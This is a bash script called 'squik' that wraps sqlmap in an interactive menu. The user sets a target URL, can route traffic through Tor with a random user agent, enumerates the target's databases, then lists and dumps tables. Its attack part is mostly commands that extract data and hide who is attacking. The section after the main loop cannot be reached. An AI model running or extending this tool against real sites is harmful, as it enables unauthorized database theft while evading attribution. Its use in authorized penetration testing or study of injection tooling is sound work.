#!/bin/bash

####
#
# TODO: grep TABLES from output
#		strip http:// or https:// from URL
#		clear screen stuff
####

#echo "###########################################################"
#echo "#                  usage: ./squik.sh                      #"
#echo "#                                                         #"
#echo "#  sql quick is a tool for simple SQL INJECTION testing   #"
#echo "#                                                         #"
#echo "#Author: Schaiger David                                   #"
#echo "###########################################################"

#URL="hackit.gehaxelt.in/sqli/level1.php?id=1"
#ANONMSG="OFF"
#ANON=""
#USER=$(whoami)
#DOMAIN="hackit.gehaxelt.in"

URL="NONE"
ANONMSG="OFF"
ANON=""
USER=$(whoami)
DOMAIN="NONE"

TMP=""
DBCNT=""

#font colors
#RED='\033[0;31m' 
#GREEN='\033[0;32m'

NC='\033[0m' # No Color
# font + font bg colors
RED="\E[0;41m\033[1m"
GREEN="\E[30;42m\033[30m"

URLCOLOR=$RED
ANONCOLOR=$RED
DOMAINCOLOR=$RED
DBSCOLOR=$RED



while true
do

echo -ne "\033[2J\033[1;1H"
echo -ne "${DOMAINCOLOR}Domain:\t\t$DOMAIN${NC}\n"
echo -ne "${URLCOLOR}Target:\t\t$URL${NC}\n"
echo -ne "${ANONCOLOR}Anonymous:\t$ANONMSG${NC}\n"
echo -ne "\n${DBSCOLOR}$DBCNT\t${DBARRAY[*]}${NC}\n"

echo -ne "\nsq> " 
read CMD ARG

case $CMD in
	"target")
		if [ -z "$ARG" ]; then
			URL="NONE"
			DOMAIN="NONE"
			URLCOLOR=$RED
			DOMAINCOLOR=$RED
		else
		URL=$ARG
		URLCOLOR=$GREEN
		DOMAIN=$(echo $URL | grep -oP '^[^\/]*')
		DOMAINCOLOR=$GREEN
		unset DBARRAY
		unset DBCNT
		fi
		;;
	"anon")
		if [ "$ARG" == "on" ]; then
			ANONMSG="ON"
			ANON="--tor --tor-type=SOCKS5 --tor-port 9050 --check-tor --random-agent"
			ANONCOLOR=$GREEN
		elif [ "$ARG" == "off" ]; then
			ANONMSG="OFF"
			ANON=""
			ANONCOLOR=$RED
		fi
		;;
	"run")
		if [ "$URL" = "NONE" ]; then
			echo -ne "${RED}[!] set target URL first${NC}"
		else 
		
			rm /home/$USER/.sqlmap/output/$DOMAIN/log
		
			sqlmap -o $ANON -u $URL --dbs #attack string
			TMP=$(cat /home/$USER/.sqlmap/output/$DOMAIN/log | grep -oP '(?<=\[\*\] ).*' | sort | uniq)
			DBCNT="DBS [$(echo $TMP | wc -w)]:"
		
			CNT=0
			for i in ${TMP//'\n'/};
			do
				DBARRAY[CNT]=$i;
				((CNT++));
			done
		fi
		
		DBSCOLOR=$GREEN
		echo -ne "\n<continue>"
		read -n 1 -s
		;;
	"exit")
		exit 0
		;;
	"?"|"help")
		echo -e "\nset target URL:  target <URL>"
		echo "set anonymous:   anon <on|off>"
		echo "start scan:      run"
		echo "quit squik:      exit"
		echo ""
		echo -n "<continue>"
		read -n 1 -s
		;;
esac

done
###########################
#
# BASIC enumeration / anon
#
###########################




###########################
#
# DB enumeration
#
###########################
echo ""
echo "--------------------squik"
echo "[1] enumerate DB: "
echo "[2] exit"

read CHOICE

if [ $CHOICE == 1 ]; then
echo ""
echo -n "paste target DB: "
read DB
elif [ $CHOICE == 2 ]; then
exit 0
fi

sqlmap -o $ANON -u $URL --tables -D $DB

###########################
#
# dump TABLE
#
###########################
echo ""
echo "--------------------squik"
echo "[1] dump table: "
echo "[2] exit"

read CHOICE

if [ $CHOICE == 1 ]; then
echo ""
echo -n "paste target TABLE: "
read TABLE
elif [ $CHOICE == 2 ]; then
exit 0
fi

sqlmap -o $ANON -u $URL --dump -T $TABLE -D $DB


